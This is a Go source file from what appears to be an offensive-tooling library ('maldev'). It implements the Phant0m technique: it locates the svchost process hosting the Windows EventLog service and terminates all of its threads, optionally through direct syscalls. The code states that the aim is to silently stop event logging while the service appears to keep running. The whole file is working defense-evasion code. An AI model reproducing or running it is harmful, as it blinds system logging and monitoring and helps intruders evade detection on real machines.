//go:build windows

package phant0m

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// threadEntry32 matches THREADENTRY32 for CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD).
// x/sys/windows does not expose ThreadEntry32, so we define it locally.
type threadEntry32 struct {
	Size           uint32
	Usage          uint32
	ThreadID       uint32
	OwnerProcessID uint32
	BasePri        int32
	DeltaPri       int32
	Flags          uint32
}

var (
	procThread32First = api.Kernel32.NewProc("Thread32First")
	procThread32Next  = api.Kernel32.NewProc("Thread32Next")
)

// Kill terminates all threads belonging to the Windows Event Log service.
// The service process (svchost.exe) continues running but its worker threads
// are killed, silently stopping all event log writes.
//
// Requires SeDebugPrivilege (typically available to SYSTEM or elevated admin).
func Kill(caller *wsyscall.Caller) error {
	pid, err := findEventLogPID()
	if err != nil {
		return fmt.Errorf("find EventLog PID: %w", err)
	}

	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
	}
	defer windows.CloseHandle(snap)

	var te threadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	r, _, err := procThread32First.Call(uintptr(snap), uintptr(unsafe.Pointer(&te)))
	if r == 0 {
		return fmt.Errorf("Thread32First: %w", err)
	}

	killed := 0
	for {
		if te.OwnerProcessID == pid {
			hThread, openErr := windows.OpenThread(windows.THREAD_TERMINATE, false, te.ThreadID)
			if openErr == nil {
				if caller != nil {
					ret, _ := caller.Call("NtTerminateThread", uintptr(hThread), 0)
					if ret == 0 {
						killed++
					}
				} else {
					r, _, _ = api.ProcTerminateThread.Call(uintptr(hThread), 0)
					if r != 0 {
						killed++
					}
				}
				windows.CloseHandle(hThread)
			}
		}

		te.Size = uint32(unsafe.Sizeof(te))
		r, _, _ = procThread32Next.Call(uintptr(snap), uintptr(unsafe.Pointer(&te)))
		if r == 0 {
			break
		}
	}

	if killed == 0 {
		return fmt.Errorf("no EventLog threads found for PID %d", pid)
	}
	return nil
}

// findEventLogPID finds the PID of the svchost.exe instance hosting EventLog.
func findEventLogPID() (uint32, error) {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return 0, fmt.Errorf("OpenSCManager: %w", err)
	}
	defer windows.CloseServiceHandle(scm)

	svcName, _ := windows.UTF16PtrFromString("EventLog")
	svc, err := windows.OpenService(scm, svcName, windows.SERVICE_QUERY_STATUS)
	if err != nil {
		return 0, fmt.Errorf("OpenService EventLog: %w", err)
	}
	defer windows.CloseServiceHandle(svc)

	var needed uint32
	var ssp windows.SERVICE_STATUS_PROCESS
	err = windows.QueryServiceStatusEx(svc, windows.SC_STATUS_PROCESS_INFO,
		(*byte)(unsafe.Pointer(&ssp)), uint32(unsafe.Sizeof(ssp)), &needed)
	if err != nil {
		return 0, fmt.Errorf("QueryServiceStatusEx: %w", err)
	}

	if ssp.ProcessId == 0 {
		return 0, fmt.Errorf("EventLog service not running")
	}
	return ssp.ProcessId, nil
}
